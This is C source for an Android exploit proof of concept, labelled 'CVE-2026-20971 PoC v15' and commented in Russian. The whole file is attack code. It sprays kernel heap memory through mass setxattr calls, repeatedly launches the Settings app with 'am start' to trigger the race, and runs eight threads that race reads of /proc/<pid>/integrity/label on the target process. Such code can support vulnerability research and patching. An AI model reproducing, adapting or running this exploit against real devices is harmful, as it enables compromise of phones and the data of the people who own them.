#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <errno.h>

int find_pid(const char *name) {
    DIR *dir = opendir("/proc");
    struct dirent *entry;
    int pid = -1;
    if (!dir) return -1;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            int id = atoi(entry->d_name);
            if (id > 0) {
                char path[256], cmdline[128];
                snprintf(path, sizeof(path), "/proc/%d/cmdline", id);
                int fd = open(path, O_RDONLY);
                if (fd >= 0) {
                    int n = read(fd, cmdline, sizeof(cmdline)-1);
                    close(fd);
                    if (n > 0) {
                        cmdline[n] = '\0';
                        if (strstr(cmdline, name) != NULL) {
                            pid = id;
                            break;
                        }
                    }
                }
            }
        }
    }
    closedir(dir);
    return pid;
}

void* spray_thread(void* arg) {
    char value[56]; 
    memset(value, 0xFF, sizeof(value)); 
    char path[64];
    snprintf(path, sizeof(path), "/data/local/tmp/spray_%d", gettid());
    int fd = open(path, O_CREAT | O_RDWR, 0600);
    if (fd >= 0) close(fd);
    long count = 0;
    while(1) {
        char name[64];
        snprintf(name, sizeof(name), "user.spray_%ld", count++);
        setxattr(path, name, value, sizeof(value), 0);
    }
    return NULL;
}

void* reader_thread(void* arg) {
    long id = (long)arg;
    char buf[256];
    long iter = 0;
    while(1) {
        // Ищем процесс, который сейчас загружается (app_process64 или настройки)
        int pid = find_pid("app_process64");
        if (pid == -1) pid = find_pid("com.android.settings");
        
        if (pid != -1) {
            char path[64];
            snprintf(path, sizeof(path), "/proc/%d/integrity/label", pid);
            int fd = open(path, O_RDONLY);
            if (fd >= 0) {
                read(fd, buf, sizeof(buf)); 
                close(fd);
                iter++;
                if (iter % 5000 == 0) {
                    printf("[Reader %ld] Iter: %ld\n", id, iter);
                }
            }
        }
    }
    return NULL;
}

void* trigger_thread(void* arg) {
    while(1) {
        // Просто запускаем настройки. Zygote форкнет процесс и вызовет execve
        system("am start -n com.android.settings/.Settings > /dev/null 2>&1");
        usleep(300000); // 300 мс на загрузку
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    printf("[*] CVE-2026-20971 PoC v15 (Multi-thread Reader)\n");

    // 4 потока спрея
    for (int i=0; i<4; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, spray_thread, NULL);
        pthread_detach(tid);
    }

    // 1 поток триггера (am start)
    pthread_t trigger_tid;
    pthread_create(&trigger_tid, NULL, trigger_thread, NULL);
    pthread_detach(trigger_tid);

    // 8 потоков чтения
    for (long i=0; i<8; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, reader_thread, (void*)i);
        pthread_detach(tid);
    }

    while(1) sleep(10);
    return 0;
}